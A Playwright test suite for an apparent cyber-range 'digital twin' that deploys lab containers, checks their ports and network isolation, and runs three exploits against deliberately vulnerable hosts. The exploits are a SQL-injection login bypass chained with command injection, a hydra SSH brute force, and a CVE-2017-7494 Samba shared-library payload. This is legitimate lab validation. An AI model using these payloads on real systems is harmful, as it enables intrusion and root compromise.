import { test, expect } from '@playwright/test'
import { execSync } from 'child_process'

const BASE = 'http://localhost:8888'
const API = `${BASE}/api`
const PASSWORD = process.env.ADMIN_PASSWORD || 'admin'

let authToken = ''

function dockerExec(container, cmd) {
  return execSync(`docker exec ${container} ${cmd}`, {
    encoding: 'utf-8',
    timeout: 30000,
  }).trim()
}

/**
 * Parse an NDJSON response body and return the last "result" payload.
 * The deploy/stop endpoints stream {type:"progress"} lines followed by
 * a final {type:"result", data:{...}} line.
 */
async function parseNdjsonResult(res) {
  const text = await res.text()
  const lines = text.trim().split('\n').filter(Boolean)
  const parsed = lines.map((l) => JSON.parse(l))
  const errorLine = parsed.find((o) => o.type === 'error')
  if (errorLine) throw new Error(`Deploy error: ${errorLine.message}`)
  const resultLine = parsed.find((o) => o.type === 'result')
  if (resultLine) return resultLine.data
  throw new Error('No result line found in NDJSON response')
}

test.describe.serial('Digital Twin', () => {
  test.beforeAll(async ({ request }) => {
    const res = await request.post(`${API}/login`, {
      data: { username: 'admin', password: PASSWORD },
    })
    expect(res.ok()).toBeTruthy()
    const body = await res.json()
    authToken = body.token
  })

  test('deploy creates 10 containers', async ({ request }) => {
    const res = await request.post(`${API}/digital-twin/deploy`, {
      headers: { Authorization: `Bearer ${authToken}` },
    })
    expect(res.ok()).toBeTruthy()
    const data = await parseNdjsonResult(res)
    expect(data.containers.length).toBe(10)
  })

  test('status shows all 10 running', async ({ request }) => {
    const res = await request.get(`${API}/digital-twin/status`, {
      headers: { Authorization: `Bearer ${authToken}` },
    })
    expect(res.ok()).toBeTruthy()
    const body = await res.json()
    expect(body.deployed).toBe(true)
    expect(body.containers.length).toBe(10)
    for (const c of body.containers) {
      expect(c.status).toBe('running')
    }
  })

  test('Server 1 Nginx listens on port 80', () => {
    // Retry for up to 15s — PHP-FPM may still be starting
    let out = ''
    for (let i = 0; i < 15; i++) {
      try {
        out = dockerExec(
          'ccs_dt_i1_server_1',
          'curl -s -o /dev/null -w "%{http_code}" http://127.0.0.1:80/'
        )
        if (out === '200') break
      } catch {
        // curl may fail if service not ready yet
      }
      execSync('sleep 1')
    }
    expect(out).toBe('200')
  })

  test('Server 3 SSH listens on port 22', () => {
    const out = dockerExec('ccs_dt_i1_server_3', 'ss -tlnp')
    expect(out).toContain(':22')
  })

  test('Server 5 API on 8080 and Redis on 6379', () => {
    const out = dockerExec('ccs_dt_i1_server_5', 'ss -tlnp')
    expect(out).toContain(':8080')
    expect(out).toContain(':6379')
  })

  test('Server 6 Samba and PostgreSQL listen', () => {
    // Retry for up to 15s — Samba may still be starting
    let out = ''
    for (let i = 0; i < 15; i++) {
      out = dockerExec('ccs_dt_i1_server_6', 'ss -tlnp')
      if (out.includes(':445') && out.includes(':5432')) break
      execSync('sleep 1')
    }
    expect(out).toContain(':445')
    expect(out).toContain(':5432')
  })

  test('exploit: SQL injection on Server 1', () => {
    // Step 1: Auth bypass via SQL injection
    const loginOut = dockerExec(
      'ccs_dt_i1_server_1',
      `curl -s -c /tmp/cookies -L -d "username=admin' OR '1'='1' --&password=x" http://127.0.0.1:80/index.php`
    )
    expect(loginOut).toContain('Diagnostics')

    // Step 2: Command injection via shell.php
    const shellOut = dockerExec(
      'ccs_dt_i1_server_1',
      'curl -s -b /tmp/cookies -d "host=; id" http://127.0.0.1:80/shell.php'
    )
    expect(shellOut).toContain('uid=0(root)')
  })

  test('exploit: SSH brute force on Server 3', () => {
    // Create a small dictionary on the gateway
    dockerExec(
      'ccs_dt_i1_gateway',
      'bash -c "printf \'admin\\nroot\\ntest\\npassword123\\nuser\\n\' > /tmp/dict.txt"'
    )

    // Run hydra from the gateway against Server 3
    const hydraOut = dockerExec(
      'ccs_dt_i1_gateway',
      'hydra -l admin -P /tmp/dict.txt -t 4 -f 10.0.3.3 ssh 2>&1 || true'
    )
    expect(hydraOut).toContain('admin')

    // Verify sudo gives root
    const sshOut = dockerExec(
      'ccs_dt_i1_gateway',
      'sshpass -p admin ssh -o StrictHostKeyChecking=no admin@10.0.3.3 "sudo id"'
    )
    expect(sshOut).toContain('uid=0(root)')
  })

  test('exploit: CVE-2017-7494 on Server 6', () => {
    // Step 1: Samba version is in vulnerable range (3.5.0 – 4.4.x)
    const smbVer = dockerExec('ccs_dt_i1_server_6', 'smbd --version')
    expect(smbVer).toMatch(/4\.[0-4]/)

    // Step 2: nt pipe support enabled (required for CVE-2017-7494)
    const smbConf = dockerExec(
      'ccs_dt_i1_server_6',
      'bash -c "grep -i \'nt pipe support\' /etc/samba/smb.conf"'
    )
    expect(smbConf.toLowerCase()).toContain('yes')

    // Step 3: Share is world-writable (attacker can upload .so)
    const smbGuest = dockerExec(
      'ccs_dt_i1_server_6',
      'bash -c "grep -i \'guest ok\' /etc/samba/smb.conf"'
    )
    expect(smbGuest.toLowerCase()).toContain('yes')
    const smbWritable = dockerExec(
      'ccs_dt_i1_server_6',
      'bash -c "grep -i \'read only\' /etc/samba/smb.conf"'
    )
    expect(smbWritable.toLowerCase()).toContain('no')

    // Step 4: Compile and load payload .so to prove code execution as root
    dockerExec(
      'ccs_dt_i1_server_6',
      `bash -c 'cat > /tmp/payload.c << "CEOF"
#include <stdlib.h>
__attribute__((constructor))
void init(void) { system("touch /tmp/cve_2017_7494_exploited"); }
CEOF'`
    )
    dockerExec(
      'ccs_dt_i1_server_6',
      'gcc -shared -fPIC -o /srv/public/payload.so /tmp/payload.c'
    )
    // dlopen simulates what smbd does when CVE-2017-7494 is triggered
    dockerExec(
      'ccs_dt_i1_server_6',
      'bash -c \'python -c "import ctypes; ctypes.cdll.LoadLibrary(\\"/srv/public/payload.so\\")" 2>/dev/null || true\''
    )
    const check = dockerExec(
      'ccs_dt_i1_server_6',
      'ls /tmp/cve_2017_7494_exploited 2>&1 || echo NOT_FOUND'
    )
    expect(check).toContain('cve_2017_7494_exploited')
    expect(check).not.toContain('NOT_FOUND')
  })

  test('positive reachability between linked hosts', () => {
    const pairs = [
      ['i1_gateway', '10.0.1.253'],
      ['i1_firewall', '10.0.1.252'],
      ['i1_log_collector', '10.0.2.2'],
      ['i1_log_collector', '10.0.3.3'],
      ['i1_server_1', '10.0.2.2'],
      ['i1_server_1', '10.0.3.4'],
      ['i1_server_1', '10.0.4.6'],
      ['i1_server_2', '10.0.3.3'],
      ['i1_server_2', '10.0.4.5'],
      ['i1_server_3', '10.0.4.6'],
      ['i1_server_4', '10.0.4.5'],
      ['i1_server_5', '10.0.4.6'],
    ]
    for (const [host, ip] of pairs) {
      const out = dockerExec(
        `ccs_dt_${host}`,
        `ping -c 1 -W 2 ${ip}`
      )
      expect(out).toContain('1 received')
    }
  })

  test('zone isolation blocks cross-zone traffic', () => {
    const pairs = [
      ['i1_server_5', '10.0.2.1'],
      ['i1_server_5', '10.0.3.3'],
      ['i1_server_6', '10.0.2.2'],
      ['i1_server_3', '10.0.2.1'],
    ]
    for (const [host, ip] of pairs) {
      expect(() => {
        dockerExec(`ccs_dt_${host}`, `ping -c 1 -W 2 ${ip}`)
      }).toThrow()
    }
  })

  test('validate specification commands', async ({ request }) => {
    const res = await request.post(`${API}/digital-twin/validate`, {
      headers: { Authorization: `Bearer ${authToken}` },
    })
    expect(res.ok()).toBeTruthy()

    const text = await res.text()
    const lines = text.trim().split('\n').filter(Boolean)
    const parsed = lines.map((l) => JSON.parse(l))

    const results = parsed.filter((o) => o.type === 'result')
    const done = parsed.find((o) => o.type === 'done')

    expect(results.length).toBe(34)
    expect(done).toBeTruthy()

    // All spec commands should pass
    const passed = results.filter((r) => r.passed)
    expect(passed.length).toBe(34)

    // Each result should have the expected shape
    for (const r of results) {
      expect(r).toHaveProperty('host')
      expect(r).toHaveProperty('description')
      expect(r).toHaveProperty('command')
      expect(typeof r.passed).toBe('boolean')
      expect(r).toHaveProperty('output')
    }
  })

  test.afterAll(async ({ request }) => {
    const res = await request.post(`${API}/digital-twin/stop`, {
      headers: { Authorization: `Bearer ${authToken}` },
    })
    // Consume the NDJSON stream so the server finishes cleanup
    await res.text()
  })
})
